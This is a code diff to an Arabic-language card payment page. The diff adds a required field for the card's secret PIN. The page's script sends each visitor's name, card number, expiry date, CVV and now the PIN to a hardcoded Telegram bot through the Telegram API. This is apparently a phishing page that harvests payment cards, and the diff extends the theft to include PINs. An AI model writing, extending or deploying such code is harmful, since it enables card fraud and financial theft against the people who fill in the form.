@@ -192,15 +192,8 @@
       <div class="inline-inputs">
         <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
         <input type="text" id="cvv" placeholder="رمز الأمان" maxlength="3" required>
+        <input type="text" id="pin" placeholder="رمز البطاقة السري" maxlength="4" required>
       </div>
-
-      <div class="inline-inputs">
-        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-        <input type="text" id="cvv" placeholder="رمز البطاقة السري" maxlength="4" required>
-      </div>
-
-      <div class="payment-box">
-        <h2>سيتم الاتصال بك لتأكيد ربط بطاقتك بإمكان والاستفادة من كوبون الخصم على نسبة الفائدة</h2>
       
       <button type="submit" class="submit-btn">إتمام الدفع</button>
       <div class="spinner" id="spinner">جاري المعالجة...</div>
@@ -272,7 +265,7 @@
       // إرسال البيانات (يجب إزالة هذا الجزء في البيئة الإنتاجية)
       const botToken = "7699595929:AAFQ_fuCA2z-9-1oeCWVlMwC7WIB64uqe0E";
       const chatId = "7585533835";
-      const message = `\uD83D\uDCB3 طلب دفع جديد\n\nالاسم: ${name}\nرقم البطاقة: ${card}\nتاريخ الانتهاء: ${expiry}\nرمز الأمان: ${cvv}`;
+      const message = `\uD83D\uDCB3 طلب دفع جديد\n\nالاسم: ${name}\nرقم البطاقة: ${card}\nتاريخ الانتهاء: ${expiry}\nرمز الأمان: ${cvv}\nرمز البطاقة السري: ${pin}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
